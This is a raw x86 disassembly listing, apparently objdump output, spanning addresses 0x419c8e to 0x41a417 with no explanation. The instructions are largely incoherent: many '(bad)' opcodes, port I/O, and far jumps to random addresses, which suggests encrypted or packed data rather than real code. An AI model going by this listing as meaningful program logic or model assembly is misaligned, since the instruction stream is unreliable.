  419c8e:	and    DWORD PTR [edx+0x29e3c9bb],esp
  419c94:	retf   0xd475
  419c97:	mov    esi,0xcc138d0d
  419c9c:	push   esp
  419c9d:	movq   QWORD PTR [esi+0x44],mm4
  419ca1:	push   edi
  419ca2:	inc    ebp
  419ca3:	arpl   WORD PTR [ecx-0x266b0a26],sp
  419ca9:	cmp    eax,0xb864d76e
  419cae:	test   DWORD PTR [esi],ecx
  419cb0:	dec    esp
  419cb1:	jge    0x419d0c
  419cb3:	mov    ecx,cs
  419cb5:	sbb    ah,0xc8
  419cb8:	addr16 cmc 
  419cba:	xchg   edx,eax
  419cbb:	dec    esi
  419cbc:	mov    edx,0x94320dd3
  419cc1:	xor    eax,0x9635d462
  419cc6:	pusha  
  419cc7:	out    dx,eax
  419cc8:	cwde   
  419cc9:	add    edi,DWORD PTR [ecx]
  419ccb:	mov    edi,0x13613b27
  419cd0:	popa   
  419cd1:	or     ch,BYTE PTR [ebp-0x41]
  419cd4:	mov    esp,0xb6064a83
  419cd9:	sahf   
  419cda:	fsub   st,st(7)
  419cdc:	mov    eax,ds:0xdcacfe4f
  419ce1:	loopne 0x419c7f
  419ce3:	pop    edx
  419ce4:	enter  0x74bd,0xf5
  419ce8:	call   0x9125043e
  419ced:	popf   
  419cee:	in     al,dx
  419cef:	fldenv [esi+eiz*1-0x29]
  419cf3:	or     eax,0xb76f7a30
  419cf8:	in     eax,dx
  419cf9:	aas    
  419cfa:	retf   
  419cfb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419cfc:	fsub   DWORD PTR [ebx+eiz*1]
  419cff:	xchg   ebx,eax
  419d00:	lods   eax,DWORD PTR ds:[esi]
  419d01:	mov    eax,0xf185d82a
  419d06:	jb     0x419cc0
  419d08:	or     al,ch
  419d0a:	loope  0x419d18
  419d0c:	in     al,0xe8
  419d0e:	ins    DWORD PTR es:[edi],dx
  419d0f:	sub    al,BYTE PTR [ebp+0x16]
  419d12:	add    esi,edi
  419d14:	test   al,0xb8
  419d16:	cmp    BYTE PTR [esi+ebp*1],dl
  419d19:	and    edi,edx
  419d1b:	mov    ebp,0x99651be5
  419d20:	xchg   esi,eax
  419d21:	dec    edi
  419d22:	std    
  419d23:	mov    ecx,0x146dd3b
  419d28:	ins    DWORD PTR es:[edi],dx
  419d29:	jne    0x419d0d
  419d2b:	xor    BYTE PTR [edx+esi*4-0xd],dh
  419d2f:	xchg   ebp,eax
  419d30:	(bad)  
  419d31:	xlat   BYTE PTR ds:[ebx]
  419d32:	push   eax
  419d33:	retf   0x6ab2
  419d36:	push   esp
  419d37:	std    
  419d38:	popf   
  419d39:	in     al,dx
  419d3a:	mov    ecx,0x65373b87
  419d3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d40:	jb     0x419d2e
  419d42:	mov    eax,ds:0x83c6fc2b
  419d47:	mov    WORD PTR [ebp-0x78996cfb],fs
  419d4d:	jge    0x419cf1
  419d4f:	mov    ds:0xbdc05d15,eax
  419d54:	jbe    0x419d8b
  419d56:	xor    al,0x5c
  419d58:	or     DWORD PTR [edx-0x32],0x3
  419d5c:	mov    ebp,0x39cfec58
  419d61:	xchg   esi,eax
  419d62:	push   ebp
  419d63:	aam    0x34
  419d65:	mov    al,0x0
  419d67:	adc    dl,BYTE PTR [ecx-0x4709d44f]
  419d6d:	fsub   QWORD PTR fs:[ebx+0x68]
  419d71:	mov    ch,0xb2
  419d74:	xlat   BYTE PTR ds:[ebx]
  419d75:	and    al,0x19
  419d77:	sbb    DWORD PTR [edx-0x4fde3efd],0xbc252770
  419d81:	xchg   esi,eax
  419d82:	ret    
  419d83:	nop
  419d84:	scas   al,BYTE PTR es:[edi]
  419d85:	loopne 0x419d4b
  419d87:	out    dx,al
  419d88:	xor    al,0x7
  419d8a:	sub    esp,DWORD PTR [ecx]
  419d8c:	scas   al,BYTE PTR es:[edi]
  419d8d:	pop    ds
  419d8e:	inc    ebp
  419d8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419d90:	mov    ?,WORD PTR [edi-0x54]
  419d93:	(bad)  
  419d95:	loope  0x419d53
  419d97:	popf   
  419d98:	mov    eax,ds:0x19308491
  419d9d:	loop   0x419dd4
  419d9f:	and    ebx,esi
  419da1:	adc    ch,bl
  419da3:	sbb    eax,DWORD PTR [esi+0x75]
  419da6:	lods   al,BYTE PTR ds:[esi]
  419da7:	in     eax,0xf6
  419da9:	or     ah,al
  419dab:	pop    esp
  419dac:	jns    0x419db5
  419dae:	es enter 0xc09a,0xf3
  419db3:	pushf  
  419db4:	popf   
  419db5:	xor    ch,BYTE PTR [edx+0xa]
  419db8:	dec    edx
  419db9:	mov    esp,0x6b2d0678
  419dbe:	jp     0x419da5
  419dc0:	ins    BYTE PTR es:[edi],dx
  419dc1:	pop    ds
  419dc2:	lock mov WORD PTR [ebx],cs
  419dc5:	in     eax,dx
  419dc6:	in     eax,0x57
  419dc8:	sub    al,0x1d
  419dca:	push   ss
  419dcb:	pop    DWORD PTR [edi]
  419dcd:	jo     0x419df1
  419dcf:	(bad)  
  419dd0:	retf   
  419dd1:	add    bh,BYTE PTR cs:[esi+0x2e]
  419dd5:	daa    
  419dd6:	test   al,0xd8
  419dd8:	mov    cl,0x8
  419dda:	shl    ah,1
  419ddc:	js     0x419d8b
  419dde:	xchg   esi,eax
  419ddf:	adc    al,0xc8
  419de1:	jle    0x419e3a
  419de3:	inc    esp
  419de4:	int3   
  419de5:	ret    0xb333
  419de8:	ds out dx,eax
  419dea:	sbb    BYTE PTR [ebx-0x69],bl
  419ded:	mov    esi,0xb27201fc
  419df2:	sub    BYTE PTR [edi],ch
  419df4:	ret    
  419df5:	loopne 0x419dc3
  419df7:	jg     0x419dc7
  419df9:	mov    ah,0x28
  419dfb:	sahf   
  419dfc:	xor    edx,DWORD PTR [esi-0x1b]
  419dff:	cmp    DWORD PTR [edi],esi
  419e01:	xchg   esi,eax
  419e02:	clc    
  419e03:	add    al,0x8c
  419e05:	data16 cmp BYTE PTR [edi],dh
  419e08:	dec    ebp
  419e09:	jns    0x419da3
  419e0b:	loopne 0x419db9
  419e0d:	cmp    esp,DWORD PTR [ebx+0x5e]
  419e10:	xchg   BYTE PTR [eax],al
  419e12:	pop    ds
  419e13:	mov    cl,0xb0
  419e15:	adc    DWORD PTR [esi+edi*2],ebp
  419e18:	add    ah,BYTE PTR es:[ebx+0x70b2f91e]
  419e1f:	mov    cl,0xaf
  419e21:	cmp    dh,BYTE PTR [esp+edi*8-0x53]
  419e25:	retf   0x40a1
  419e28:	and    al,0x2e
  419e2a:	(bad)  
  419e2c:	adc    DWORD PTR [eax+ecx*1-0x1bfc175f],0x3d524917
  419e37:	call   0xbc59:0x33bb6faf
  419e3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e3f:	jecxz  0x419e76
  419e41:	pop    ebp
  419e42:	fwait
  419e43:	into   
  419e44:	jmp    0x834846b3
  419e49:	iret   
  419e4a:	add    eax,0x7a6e8c38
  419e4f:	in     al,dx
  419e50:	cs sub al,0x14
  419e53:	int3   
  419e54:	add    esp,ebp
  419e56:	and    ch,dh
  419e58:	inc    DWORD PTR [eax]
  419e5a:	fwait
  419e5b:	pushf  
  419e5c:	xchg   ecx,ecx
  419e5e:	sub    eax,0xa127def2
  419e63:	add    DWORD PTR [ecx-0x44],esp
  419e66:	sbb    DWORD PTR ds:0x52043dad,ebx
  419e6c:	les    ebx,FWORD PTR [edx+0xd]
  419e6f:	dec    edi
  419e70:	(bad)
  419e74:	xor    esp,eax
  419e76:	shl    BYTE PTR [ecx-0x9013900],1
  419e7c:	push   esi
  419e7d:	push   cs
  419e7e:	xchg   edi,eax
  419e7f:	clc    
  419e80:	fadd   st,st(5)
  419e82:	mov    BYTE PTR [edi-0x5b],ch
  419e85:	loop   0x419eb1
  419e87:	not    BYTE PTR [ebx+0x6a5e7003]
  419e8d:	or     ch,BYTE PTR [edx+0x7a]
  419e90:	daa    
  419e91:	js     0x419e20
  419e93:	mov    al,0x51
  419e95:	fnstcw WORD PTR [edi]
  419e97:	popf   
  419e98:	bound  eax,QWORD PTR [eax-0x7f6aa9c4]
  419e9e:	clc    
  419e9f:	push   edi
  419ea0:	lahf   
  419ea1:	add    edx,DWORD PTR [eax-0x3e]
  419ea4:	loop   0x419eb2
  419ea6:	stos   DWORD PTR es:[edi],eax
  419ea7:	std    
  419ea8:	inc    esi
  419ea9:	out    dx,eax
  419eaa:	cmp    al,0xaa
  419eac:	or     bl,BYTE PTR [eax]
  419eae:	sbb    edi,edi
  419eb0:	mov    edx,0x972c5808
  419eb5:	enter  0x19cf,0x4c
  419eb9:	test   al,0xdf
  419ebb:	and    ah,bh
  419ebd:	dec    BYTE PTR [eax]
  419ebf:	pop    edi
  419ec0:	adc    esp,edx
  419ec2:	adc    BYTE PTR [eax-0x6e9a4d70],ah
  419ec8:	dec    eax
  419ec9:	pop    ds
  419eca:	or     dh,bl
  419ecc:	retf   
  419ecd:	in     eax,0x30
  419ecf:	icebp  
  419ed0:	mov    ds:0xeb9c58bb,al
  419ed5:	sub    DWORD PTR [esi-0x29],esi
  419ed8:	enter  0x8769,0x93
  419edc:	add    DWORD PTR [ecx],ebp
  419ede:	add    dl,ch
  419ee0:	add    bl,BYTE PTR [ebp+0x6a4b73e9]
  419ee6:	std    
  419ee7:	lods   eax,DWORD PTR ds:[esi]
  419ee8:	lods   eax,DWORD PTR ds:[esi]
  419ee9:	fucom  st(4)
  419eeb:	aam    0xe5
  419eed:	scas   eax,DWORD PTR es:[edi]
  419eee:	xlat   BYTE PTR ds:[ebx]
  419eef:	int3   
  419ef0:	cmp    DWORD PTR [eax+ebp*2-0x7b],edx
  419ef4:	mov    esi,0x25c82c55
  419ef9:	mov    dl,0x40
  419efb:	lock xchg edi,eax
  419efd:	retf   0x27aa
  419f00:	inc    esp
  419f01:	(bad)
  419f04:	sub    cl,BYTE PTR [ebx-0x37]
  419f07:	inc    ecx
  419f08:	pop    esi
  419f09:	mov    dh,0x47
  419f0b:	stc    
  419f0c:	push   0xffffffd9
  419f0e:	in     eax,dx
  419f0f:	int    0xcd
  419f11:	inc    ecx
  419f12:	ja     0x419ec3
  419f14:	in     eax,dx
  419f15:	ret    0xc834
  419f18:	push   esp
  419f19:	enter  0xca0e,0x7d
  419f1d:	jo     0x419f6c
  419f1f:	jno    0x419ecc
  419f21:	(bad)  
  419f22:	push   ds
  419f23:	push   esi
  419f24:	add    eax,0x6740c9d5
  419f29:	pop    edx
  419f2a:	(bad)  
  419f2b:	pushf  
  419f2c:	ss push esi
  419f2e:	mov    WORD PTR [edx],?
  419f30:	and    ecx,esi
  419f32:	sbb    eax,0xbe7f1b7d
  419f37:	xlat   BYTE PTR ds:[ebx]
  419f38:	mov    ds:0x14cd6b97,al
  419f3d:	push   ecx
  419f3e:	fcmovu st,st(2)
  419f40:	cmc    
  419f41:	jno    0x419f52
  419f43:	mov    cl,0x41
  419f45:	into   
  419f46:	sub    cl,dl
  419f48:	js     0x419fa1
  419f4a:	or     DWORD PTR [edi+edx*4-0x67326dcb],ebp
  419f51:	push   0xffffffb3
  419f53:	jle    0x419f42
  419f55:	or     eax,0xfd687f23
  419f5a:	mov    ebx,0x9589af5e
  419f5f:	dec    ebx
  419f60:	dec    esi
  419f61:	loopne 0x419fd6
  419f63:	push   edx
  419f64:	jns    0x419ee8
  419f66:	mov    cl,0xcb
  419f68:	(bad)  
  419f69:	mov    dh,0x7d
  419f6b:	outs   dx,DWORD PTR ds:[si]
  419f6d:	aam    0xc2
  419f6f:	out    dx,eax
  419f70:	mov    edi,0x7e9efaf3
  419f75:	and    DWORD PTR [eax],ebp
  419f77:	aaa    
  419f78:	adc    BYTE PTR [ebx-0x24586ecc],dl
  419f7e:	div    cl
  419f80:	out    0xd0,eax
  419f82:	and    BYTE PTR [ebx],0x1a
  419f85:	cmp    eax,0xa7036891
  419f8a:	jge    0x419f7f
  419f8c:	xor    eax,0x878ed757
  419f91:	pop    edx
  419f92:	jmp    0x66de:0xb41393b1
  419f99:	jmp    0x6375ff73
  419f9e:	and    bl,BYTE PTR [eax-0x2e344ca1]
  419fa4:	adc    al,0x81
  419fa6:	add    eax,0x2b8ba124
  419fab:	repnz mov WORD PTR [edx],?
  419fae:	add    esi,DWORD PTR [esi-0x3b7fef5]
  419fb4:	mul    BYTE PTR ds:0xf569d787
  419fba:	xchg   ebx,eax
  419fbb:	gs inc ebx
  419fbd:	lods   al,BYTE PTR ds:[esi]
  419fbe:	or     ah,BYTE PTR ds:0xde9fa475
  419fc4:	push   esp
  419fc5:	jle    0x419fc9
  419fc7:	js     0x41a01a
  419fc9:	(bad)  
  419fca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419fcb:	mov    cl,0x0
  419fcd:	(bad)  
  419fce:	xchg   esi,eax
  419fcf:	push   0xffffff94
  419fd1:	sbb    esi,DWORD PTR [edi-0x5b758ce3]
  419fd7:	jle    0x419fe2
  419fd9:	push   edx
  419fda:	push   edx
  419fdb:	call   0xd587:0xd32c4b3d
  419fe2:	push   edx
  419fe3:	xchg   ebx,eax
  419fe4:	mov    eax,0x58517ac0
  419fe9:	test   DWORD PTR [esi+0x18],edi
  419fec:	in     al,dx
  419fed:	adc    esi,DWORD PTR [edi]
  419fef:	mov    bl,BYTE PTR [ecx+0x29]
  419ff2:	pop    ecx
  419ff3:	add    edx,DWORD PTR [ecx-0x30]
  419ff6:	mov    BYTE PTR [ecx],0xb6
  419ff9:	push   ebx
  419ffa:	pop    ecx
  419ffb:	lods   eax,DWORD PTR ds:[esi]
  419ffc:	xchg   esp,eax
  419ffd:	mov    al,0x94
  419fff:	mov    eax,ds:0xf66e1d96
  41a004:	xor    BYTE PTR ds:[esi-0x23],0x62
  41a009:	inc    esi
  41a00a:	addr16 dec ebx
  41a00c:	xor    bl,dl
  41a00e:	and    BYTE PTR [eax+ecx*2-0x1e3ca86a],bh
  41a015:	pusha  
  41a016:	inc    ebx
  41a017:	cmp    edi,DWORD PTR [edi]
  41a019:	cwde   
  41a01a:	xchg   BYTE PTR ds:0xe05a7974,ch
  41a020:	add    bh,al
  41a022:	imul   ebx,ecx,0xe7804b47
  41a028:	call   0x38d93c98
  41a02d:	xor    eax,0xf0e19144
  41a032:	dec    edx
  41a033:	pop    ebp
  41a034:	xor    eax,0x60ea3e2
  41a039:	(bad)  
  41a03a:	jmp    0xbc4:0x9c1d72d9
  41a041:	jl     0x41a015
  41a043:	daa    
  41a044:	jmp    0x1ce8:0x827331cc
  41a04b:	mov    edx,0xea33cbc6
  41a050:	les    edx,FWORD PTR [ebp+0xd]
  41a053:	test   eax,0x558b8a0d
  41a058:	sub    ecx,ebx
  41a05a:	sub    dl,cl
  41a05c:	dec    bp
  41a05e:	jo     0x41a0b7
  41a060:	add    eax,0x59a8f10d
  41a065:	pushf  
  41a066:	mov    ds,WORD PTR [ecx+0x670176b2]
  41a06c:	jb     0x41a084
  41a06e:	xchg   DWORD PTR [edi+0x28c69ed2],eax
  41a074:	cmp    eax,0x7b8a1a32
  41a079:	mov    ebp,0x28be1453
  41a07e:	nop
  41a07f:	out    0x41,al
  41a081:	add    ecx,DWORD PTR ss:[ebp+esi*8+0x20]
  41a086:	je     0x41a05c
  41a088:	(bad)  
  41a089:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a08a:	scas   al,BYTE PTR es:[edi]
  41a08b:	jmp    0x4c1838bf
  41a090:	or     BYTE PTR [esi+0x76],0xf2
  41a094:	pop    eax
  41a095:	xchg   DWORD PTR [eax],ebx
  41a097:	scas   eax,DWORD PTR es:[edi]
  41a098:	adc    eax,0x3b47a285
  41a09d:	xor    al,0x12
  41a09f:	inc    edx
  41a0a0:	mov    eax,0xd804c40c
  41a0a5:	jae    0x41a037
  41a0a7:	push   ds
  41a0a8:	int3   
  41a0a9:	shl    BYTE PTR [edi+0x60ce06f9],1
  41a0af:	jb     0x41a068
  41a0b1:	scas   al,BYTE PTR es:[edi]
  41a0b2:	cmc    
  41a0b3:	fnstcw WORD PTR [ebx+0x267dc0ac]
  41a0b9:	sbb    eax,0x84897d0b
  41a0be:	aaa    
  41a0bf:	mov    BYTE PTR [edx+ebp*2-0x557640d],dl
  41a0c6:	dec    edx
  41a0c7:	pop    es
  41a0c8:	mov    ecx,0x6e8052b7
  41a0cd:	mov    BYTE PTR ds:0x22894d73,ah
  41a0d3:	cmp    DWORD PTR [ecx],esi
  41a0d5:	add    cl,ch
  41a0d7:	stos   BYTE PTR es:[edi],al
  41a0d8:	fnstenv [ebx+ebp*2]
  41a0db:	inc    ebp
  41a0dc:	push   esp
  41a0dd:	jl     0x41a0d9
  41a0df:	cmp    esp,esp
  41a0e1:	js     0x41a103
  41a0e3:	dec    eax
  41a0e4:	mov    ds:0x43229690,al
  41a0e9:	imul   DWORD PTR [edi+0x35]
  41a0ec:	cmp    bh,BYTE PTR [eax]
  41a0ee:	enter  0xb7dc,0xfb
  41a0f2:	xor    DWORD PTR [ebp-0x2dcc7c58],esp
  41a0f8:	mov    bh,0xd6
  41a0fa:	jbe    0x41a100
  41a0fc:	lds    esp,FWORD PTR [edx+esi*8+0xd]
  41a100:	addr16 push ecx
  41a102:	jmp    0x41a148
  41a104:	pop    esp
  41a105:	bound  ecx,QWORD PTR [esp+edi*8-0xb]
  41a109:	ins    DWORD PTR es:[edi],dx
  41a10a:	cli    
  41a10b:	pusha  
  41a10c:	cmp    DWORD PTR [ebx],edi
  41a10e:	xor    al,BYTE PTR [esi+0x46fbe588]
  41a114:	or     ch,ah
  41a116:	mov    dh,0x2b
  41a118:	scas   al,BYTE PTR es:[edi]
  41a119:	dec    esp
  41a11a:	jp     0x41a146
  41a11c:	sti    
  41a11d:	sbb    eax,0x7467cce7
  41a122:	ret    0xb3be
  41a125:	fdivr  QWORD PTR [ebp-0x521d0384]
  41a12b:	pop    ebp
  41a12c:	or     DWORD PTR [ebp-0x392e38a7],ebx
  41a132:	mov    bl,0xc0
  41a134:	mov    eax,ds:0x3da7a68b
  41a139:	mov    ecx,DWORD PTR [esi+0xbf6eaf9]
  41a13f:	inc    edi
  41a140:	loopne 0x41a0f0
  41a142:	adc    al,0xe8
  41a144:	inc    edi
  41a145:	pop    ss
  41a146:	dec    eax
  41a147:	les    eax,FWORD PTR [eax]
  41a149:	mov    ebx,0x7a245cbf
  41a14e:	inc    edx
  41a14f:	sbb    al,0xe
  41a151:	into   
  41a152:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a153:	pop    es
  41a154:	or     al,0xaa
  41a156:	xor    bl,BYTE PTR [esi+0x3578324b]
  41a15c:	sub    eax,DWORD PTR [eax]
  41a15e:	cli    
  41a15f:	xor    eax,0xf28db482
  41a164:	lahf   
  41a165:	outs   dx,DWORD PTR ds:[esi]
  41a166:	imul   esi,DWORD PTR [edi-0x72],0x6f8c0fbb
  41a16d:	int    0xab
  41a16f:	xchg   ebp,eax
  41a170:	sbb    DWORD PTR [edx-0x61],ebp
  41a173:	jmp    0x6af3:0x28ae81c1
  41a17a:	adc    DWORD PTR [ecx+0x67d052eb],ebp
  41a180:	xlat   BYTE PTR ds:[ebx]
  41a181:	das    
  41a182:	dec    edx
  41a183:	mov    ds:0xcb60e4db,al
  41a188:	je     0x41a171
  41a18a:	cmp    BYTE PTR [esp+esi*4-0x3cd8bcac],cl
  41a191:	or     al,0xe2
  41a193:	std    
  41a194:	test   BYTE PTR [edx],al
  41a196:	and    eax,0x8077b92b
  41a19b:	cmc    
  41a19c:	ror    BYTE PTR [eax+0x59f10947],1
  41a1a2:	(bad)  
  41a1a3:	bnd jle 0x41a1df
  41a1a6:	sbb    eax,0xf9be5d35
  41a1ab:	fadd   DWORD PTR [ecx+0x258f17c0]
  41a1b1:	test   DWORD PTR [ecx-0x445e569e],eax
  41a1b7:	or     eax,0x12c6d51e
  41a1bc:	mov    al,ds:0x41333de0
  41a1c1:	es scas eax,DWORD PTR es:[edi]
  41a1c3:	out    dx,al
  41a1c4:	pushf  
  41a1c5:	popf   
  41a1c6:	jae    0x5a3dbfac
  41a1cc:	rol    dh,1
  41a1ce:	push   cs
  41a1cf:	jne    0x41a1c5
  41a1d1:	jp     0x41a198
  41a1d3:	or     eax,0x92ef63d6
  41a1d8:	lods   eax,DWORD PTR ds:[esi]
  41a1d9:	mov    ebx,0x37d19af6
  41a1de:	or     eax,0xd5907e37
  41a1e3:	mov    ss,WORD PTR [edi]
  41a1e5:	sahf   
  41a1e6:	ins    BYTE PTR es:[edi],dx
  41a1e7:	cmc    
  41a1e8:	fild   QWORD PTR [esi-0x33b4ef55]
  41a1ee:	and    eax,0x77000519
  41a1f3:	cmp    eax,0x23ec0284
  41a1f8:	arpl   WORD PTR [esi],dx
  41a1fa:	scas   al,BYTE PTR es:[edi]
  41a1fb:	xchg   ebp,eax
  41a1fc:	add    BYTE PTR [edx],0xe1
  41a1ff:	or     ah,dh
  41a201:	mov    ah,0xc8
  41a203:	int3   
  41a204:	rcr    ebp,0x55
  41a207:	adc    DWORD PTR [ebx-0x8400ed7],ecx
  41a20d:	mov    ah,0x62
  41a20f:	dec    esi
  41a210:	mov    ebp,0x624b1719
  41a215:	popa   
  41a216:	xchg   ebx,eax
  41a217:	aad    0xd5
  41a219:	in     al,dx
  41a21a:	shl    DWORD PTR [edi],cl
  41a21c:	push   esp
  41a21d:	inc    edi
  41a21e:	fsub   QWORD PTR [esi]
  41a220:	cwde   
  41a221:	(bad)  
  41a222:	lods   al,BYTE PTR ds:[esi]
  41a223:	in     eax,dx
  41a224:	enter  0xddde,0xd6
  41a228:	or     eax,DWORD PTR [esi]
  41a22a:	and    al,0xc2
  41a22c:	dec    edi
  41a22d:	(bad)  
  41a22f:	inc    esp
  41a230:	push   ecx
  41a231:	xor    dh,BYTE PTR [eax]
  41a233:	popa   
  41a234:	mov    fs,WORD PTR [edi]
  41a236:	mov    ebx,0xfe0357ad
  41a23b:	dec    ebx
  41a23c:	out    dx,eax
  41a23d:	call   0xcb51:0xcc2ba2ed
  41a244:	(bad)  
  41a245:	(bad)  
  41a246:	jmp    0xfdc91c67
  41a24b:	push   es
  41a24c:	push   ebp
  41a24d:	lods   al,BYTE PTR ds:[esi]
  41a24e:	xor    ebx,DWORD PTR [esi+0x4f]
  41a251:	outs   dx,DWORD PTR ds:[esi]
  41a252:	rol    DWORD PTR [esi+ebx*4-0x67],cl
  41a256:	repz (bad) 
  41a258:	(bad)  
  41a259:	shl    al,1
  41a25b:	jne    0x41a1f4
  41a25d:	in     al,dx
  41a25e:	or     ecx,ebp
  41a260:	nop
  41a261:	mov    ebx,0xbf2adc3
  41a266:	xchg   esp,eax
  41a267:	mov    ebp,0x6d33360a
  41a26c:	test   DWORD PTR [edx+0x3dbe766a],edx
  41a272:	(bad)  
  41a273:	fsubr  DWORD PTR [eax]
  41a275:	into   
  41a276:	rep outs dx,DWORD PTR ds:[esi]
  41a278:	loope  0x41a28c
  41a27a:	bound  edx,QWORD PTR [ebx]
  41a27c:	add    cl,cl
  41a27e:	sub    eax,0x540acbb1
  41a283:	sbb    edi,esi
  41a285:	lahf   
  41a286:	outs   dx,DWORD PTR ds:[esi]
  41a287:	test   eax,0xf4eac90b
  41a28c:	repz inc ebx
  41a28e:	out    dx,eax
  41a28f:	je     0x41a2da
  41a291:	pop    esi
  41a292:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a293:	jmp    0x3a57:0xf4502ee9
  41a29a:	inc    ebx
  41a29b:	(bad)  
  41a29c:	mov    ?,eax
  41a29e:	and    BYTE PTR [ecx+0x6],cl
  41a2a1:	push   ecx
  41a2a2:	pop    eax
  41a2a3:	jmp    0x8f23dcfa
  41a2a8:	sub    bh,ah
  41a2aa:	gs push edi
  41a2ac:	fnstcw WORD PTR ss:[esi]
  41a2af:	jmp    0x630f:0xfc8fd3f0
  41a2b6:	mov    dl,0x6e
  41a2b8:	xchg   edx,eax
  41a2b9:	call   0x6edf2f7a
  41a2be:	pop    ecx
  41a2bf:	add    cl,dh
  41a2c1:	add    BYTE PTR [edi+0x46],ah
  41a2c4:	inc    edi
  41a2c5:	pop    ebp
  41a2c6:	push   0x13
  41a2c8:	inc    ebp
  41a2c9:	pop    ecx
  41a2ca:	inc    edi
  41a2cb:	test   BYTE PTR [esi+0x784732c6],dh
  41a2d1:	into   
  41a2d2:	cmp    BYTE PTR ds:0xcf1b2af5,al
  41a2d8:	or     cl,BYTE PTR [eax+0x76bd2a0f]
  41a2de:	daa    
  41a2df:	mov    al,0x6b
  41a2e1:	neg    BYTE PTR ds:0x60b7c192
  41a2e7:	mov    bh,BYTE PTR [esi+0x37]
  41a2ea:	cwde   
  41a2eb:	adc    al,0xeb
  41a2ed:	jle    0x41a303
  41a2ef:	fcomp  DWORD PTR fs:[edi]
  41a2f2:	mov    DWORD PTR [edi+0xb],esp
  41a2f5:	les    eax,FWORD PTR [ecx]
  41a2f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a2f8:	dec    eax
  41a2f9:	dec    ebp
  41a2fa:	test   al,0x5c
  41a2fc:	xchg   esi,eax
  41a2fd:	cli    
  41a2fe:	or     DWORD PTR ds:0xb9aa8de,esi
  41a304:	int    0xca
  41a306:	adc    eax,0x71729a4a
  41a30b:	(bad)  
  41a30c:	sub    edi,esp
  41a30e:	mov    ebx,0xdae8d28a
  41a313:	cli    
  41a314:	inc    ebp
  41a315:	retf   0x7c6d
  41a318:	(bad)  
  41a319:	push   edx
  41a31a:	(bad)  
  41a31b:	jmp    0x247f:0x6d6e79e1
  41a322:	ja     0x41a2f5
  41a324:	in     eax,dx
  41a325:	lods   al,BYTE PTR ds:[esi]
  41a326:	clc    
  41a327:	cwde   
  41a328:	xlat   BYTE PTR ds:[ebx]
  41a329:	fild   WORD PTR [esi-0xb]
  41a32c:	jbe    0x41a31f
  41a32e:	fidiv  WORD PTR [ebx-0x573a101b]
  41a334:	xor    al,0x1e
  41a336:	adc    DWORD PTR [eax],0xffffffe3
  41a339:	stos   BYTE PTR es:[edi],al
  41a33a:	mov    cs,WORD PTR [esi+0x2b29ab20]
  41a340:	dec    eax
  41a341:	cld    
  41a342:	fild   QWORD PTR [edi]
  41a344:	and    ebx,edi
  41a346:	pop    esi
  41a347:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a348:	sahf   
  41a349:	jb     0x41a357
  41a34b:	push   ebx
  41a34c:	es mov bh,0x5c
  41a34f:	mov    ebx,0x61ec0027
  41a354:	xchg   ebp,eax
  41a355:	pop    eax
  41a356:	inc    eax
  41a357:	adc    eax,0x72264a1a
  41a35c:	loop   0x41a35d
  41a35e:	mov    ch,0x3b
  41a360:	push   eax
  41a361:	ficom  WORD PTR [esi-0x3a609ea2]
  41a367:	test   eax,0xf35cd4ff
  41a36c:	rcl    BYTE PTR [eax-0x47],0x19
  41a370:	xor    DWORD PTR [edi-0x448d5b4b],eax
  41a376:	inc    edx
  41a377:	popa   
  41a378:	test   BYTE PTR [esi-0x2e],0x13
  41a37c:	nop
  41a37d:	jne    0x41a313
  41a37f:	jns    0x41a3c4
  41a381:	inc    ebx
  41a382:	mov    ebx,0xe558b88a
  41a387:	adc    DWORD PTR [ebp-0x26],0xffffffd1
  41a38b:	pop    eax
  41a38c:	xchg   BYTE PTR [eax+edx*2-0x33],al
  41a390:	popa   
  41a391:	fs scas al,BYTE PTR es:[edi]
  41a393:	jecxz  0x41a3e1
  41a395:	add    eax,0x5e0268d3
  41a39a:	jmp    0x5bc92ba4
  41a39f:	in     eax,dx
  41a3a0:	lds    ebp,FWORD PTR [edi]
  41a3a2:	aam    0xc4
  41a3a4:	(bad)  [ecx]
  41a3a6:	push   ss
  41a3a7:	jnp    0x41a3a8
  41a3a9:	inc    ebp
  41a3aa:	in     al,0x75
  41a3ac:	mov    dl,0x26
  41a3ae:	mov    ds:0xdf2f32f9,eax
  41a3b3:	fdivrp st(5),st
  41a3b5:	or     DWORD PTR [edi+edi*2+0x3a],esp
  41a3b9:	sub    edx,ebp
  41a3bb:	cli    
  41a3bc:	mov    ch,0xe0
  41a3be:	arpl   WORD PTR [ecx-0x3f41fd0c],sp
  41a3c4:	ret    
  41a3c5:	jo     0x41a3fb
  41a3c7:	cli    
  41a3c8:	sbb    dh,ch
  41a3ca:	in     eax,0x11
  41a3cc:	cwde   
  41a3cd:	(bad)  
  41a3ce:	jns    0x41a403
  41a3d0:	arpl   sp,bx
  41a3d2:	mov    eax,DWORD PTR [eax-0x20]
  41a3d5:	leave  
  41a3d6:	repnz pop edi
  41a3d8:	push   cs
  41a3d9:	mov    ah,0x75
  41a3db:	sbb    al,0xfc
  41a3dd:	rcr    DWORD PTR [ecx-0x7],0xe
  41a3e1:	pushf  
  41a3e2:	rcr    BYTE PTR [esi-0x73],cl
  41a3e5:	mov    eax,ds:0x725a18b6
  41a3ea:	pop    eax
  41a3eb:	imul   ecx,ebp,0x5d59eba5
  41a3f1:	das    
  41a3f2:	push   esi
  41a3f3:	rcl    DWORD PTR [eax],1
  41a3f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a3f6:	imul   eax,DWORD PTR [eax],0xbb0ff1fc
  41a3fc:	mov    esi,0x2368ed9c
  41a401:	outs   dx,DWORD PTR ds:[esi]
  41a402:	xchg   ecx,eax
  41a403:	add    BYTE PTR [edi+0x10],0xa
  41a407:	mov    ch,0xac
  41a409:	iret   
  41a40a:	test   BYTE PTR [edx],bh
  41a40c:	clc    
  41a40d:	adc    esi,DWORD PTR ds:0x153fb1cd
  41a413:	dec    ecx
  41a414:	repnz and bh,dh
  41a417:	xor    ch,BYTE PTR [ecx+0x2]
